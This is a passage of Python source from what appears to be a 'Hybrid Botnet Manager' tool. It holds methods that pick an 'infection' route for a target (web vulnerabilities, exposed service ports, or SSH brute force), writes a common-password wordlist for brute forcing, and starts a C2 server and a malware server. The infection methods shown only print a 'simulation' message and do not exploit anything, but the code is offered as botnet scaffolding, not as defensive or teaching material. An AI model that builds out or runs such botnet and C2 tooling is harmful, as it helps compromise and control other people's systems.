        """Infect target using web exploitation"""
        print(f"🌐 Web Infection started on {target}")
        
        # Common web vulnerabilities to check
        vulns = [
            "SQL Injection",
            "XSS (Cross-Site Scripting)",
            "File Upload",
            "Command Injection",
            "Path Traversal"
        ]
        
        print("🔍 Scanning for vulnerabilities:")
        for vuln in vulns:
            print(f"   Checking: {vuln}")
        
        print("✅ Web infection simulation completed")
        print("💡 In real implementation, vulnerabilities would be exploited to gain access")
    
    def infect_service(self, target: str):
        """Infect target using service exploitation"""
        print(f"🔌 Service Infection started on {target}")
        
        # Common services to check
        services = [
            (21, "FTP"),
            (22, "SSH"),
            (23, "Telnet"),
            (25, "SMTP"),
            (80, "HTTP"),
            (443, "HTTPS"),
            (3306, "MySQL"),
            (5432, "PostgreSQL"),
            (6379, "Redis"),
            (27017, "MongoDB")
        ]
        
        print("🔍 Checking common services:")
        for port, service in services:
            print(f"   Port {port}: {service}")
        
        print("✅ Service infection simulation completed")
        print("💡 In real implementation, vulnerable services would be exploited")
    
    def infect_auto(self, target: str):
        """Auto-detect best infection method"""
        print(f"🤖 Auto-infection started on {target}")
        print("🔍 Detecting target type...")
        
        if target.startswith(('http://', 'https://')):
            print("   Target appears to be web application")
            print("   Using web exploitation method")
            self.infect_web(target)
        elif ':' in target and target.split(':')[1].isdigit():
            print("   Target appears to be service endpoint")
            print("   Using service exploitation method")
            self.infect_service(target)
        else:
            print("   Target appears to be host/IP")
            print("   Using SSH brute force method")
            self.infect_ssh(target)
    
    def create_default_wordlist(self):
        """Create a default wordlist for brute force"""
        wordlist_file = "default_wordlist.txt"
        
        common_passwords = [
            "password", "123456", "12345678", "qwerty", "abc123",
            "password123", "admin", "root", "user", "guest",
            "admin123", "root123", "123456789", "letmein", "welcome"
        ]
        
        try:
            with open(wordlist_file, 'w') as f:
                for pwd in common_passwords:
                    f.write(pwd + '\n')
            return wordlist_file
        except:
            return "built-in list"
    
    def run(self):
        """Main run method"""
        print("🚀 Starting Hybrid Botnet Manager...")
        
        # Initialize components (continue even if some fail)
        c2_success = self.initialize_c2_server()
        if not c2_success:
            print("⚠️  C2 server initialization failed. Continuing without C2...")
            
        if self.config.get('enable_malware_server', True):
            malware_success = self.initialize_malware_server()
            if not malware_success:
                print("⚠️  Malware server initialization failed. Continuing...")
        else:
            print("ℹ️  Malware server disabled in configuration")
            
        web_success = self.initialize_web_interface()
        if not web_success:
            print("⚠️  Web interface initialization failed. CLI only mode.")
        
        # Show what actually started
        print("\n🎯 INITIALIZATION SUMMARY:")
        print(f"  C2 Server: {'✅ Started' if c2_success else '❌ Failed'}")
        print(f"  Malware Server: {'✅ Started' if malware_success else '❌ Failed'}")
        print(f"  Web Interface: {'✅ Started' if web_success else '❌ Failed'}")
        
        if not any([c2_success, malware_success, web_success]):
            print("❌ All components failed to start. Exiting.")
            return
        
        print("\n✅ System initialized successfully!")
        print("💡 Type 'help' for available commands")
        print("🌐 Type 'web' to start web interface")
        
        # Start CLI interface
        self.start_cli_interface()
        
        print("\n👋 Shutting down Hybrid Botnet Manager...")

def main():
    """Main entry point"""
    try:
        manager = HybridBotnetManager()
        manager.run()
    except KeyboardInterrupt:
        print("\n👋 Goodbye!")
    except Exception as e:
        print(f"❌ Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
